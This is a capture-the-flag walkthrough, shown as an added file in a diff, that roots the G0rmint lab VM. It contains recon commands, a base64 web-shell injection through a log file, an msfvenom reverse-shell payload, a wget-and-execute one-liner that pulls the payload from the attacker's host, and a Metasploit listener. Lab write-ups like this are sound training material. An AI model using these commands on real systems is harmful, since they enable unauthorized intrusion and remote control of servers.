@@ -1,0 +1,83 @@
+
+Hack the G0rmint VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as G0rmint. The credit for making this vm machine goes to “Noman Riffat” and it is another boot2root challenge where we have to root the server to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.134 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration.
+nmap 192.168.1.134
+
+Nmap scan shows us port 80 is open, so we open the ip address in our browser.
+We don’t find any page. So we use dirb to find the directories for more information.
+dirb http://192.168.1.134/
+
+We open robots.txt and find a directory called /g0rmint/. 
+
+When we open the directory we find a login page.
+
+We take a look at the source code for more information.
+
+ 
+When we take a look at the source code we find a backup directory called s3cretbackupdirectory/ We use dirb to enumerate files or pages in that directory.
+dirb http://192.168.1.134/g0rmint/s3cretbackupdirect0ry
+
+We find a page called info.php when we open it we find a file name backup.zip.
+
+We download the file for further information.
+
+We extract the zip file and find that the file contains the source code for the webpage.
+
+Now we take look inside style.css and we look at the name of the author.
+cat style.css | grep Author
+
+We use these details as username and email for reset password.
+
+We now take a look at reset.php file.
+
+We find that the new password is based on the time we reset our password. We create a  php file that generates a password based on the time displayed on the page.
+
+Now we generate the password using our php script.
+
+We go to the login page and use the email we find in the css file and use the password we just generated to login.
+
+Now that we are authorized we take a look at the log file. In the config.php  we find that the logs are stored in s3r3t-dir3ct0ry-f0r-l0gs/ directory in the file name  format yy-mm-dd.php
+
+Now we use the current date to open the log file.
+
+Now we use upload basic php shell through email address. We put base64 decode so that we can bypass input firewall.
+
+Now we convert our commands to base64, then we use those base64 encoded string to execute our command in the server.
+
+When we execute our command the server runs it and we are able to see the files in that directory of the server.
+
+Now we create an elf shell with msfvenom.
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.116 lport=4444 -f elf > /var/www/html/shell
+To upload our shell, we convert our commands to base64.
+echo ‘wget http://192.168.1.116/shell; chmod +x shell; ./shell’ | base64
+
+Now we setup our listener using metasploit.
+msf > use multi/handler
+msf exploit(handler) > set payload linux/x86/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.1.116
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > run
+Now when we execute our command we get our reverse_shell
+
+Now going through the files in the /var/www folder we find a file called backup.zip. when we try to extract it we find that it can be only extracted in tmp folder so we extract the zip file in /tmp/ folder.
+unzip backup.zip -d /var/tmp
+
+After extracting the zip file, we take a look inside the folder we extracted the files we find a sql file.
+
+When we open the file we find a md5 encode password for the user g0rmint.
+cat /var/tmp/db.sql | grep noman
+
+Then we when we decrypt our md5 encode hash we find a password ‘tayyab123’.
+
+We use this to connect through ssh.
+ssh g0rmint@192.168.1.116
+After connecting through ssh we use this password to gain root access.
+When we get root access we go to root folder inside the root folder we get a file called flag.txt. when we open the file we get a congratulatory message for the completion of VM.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
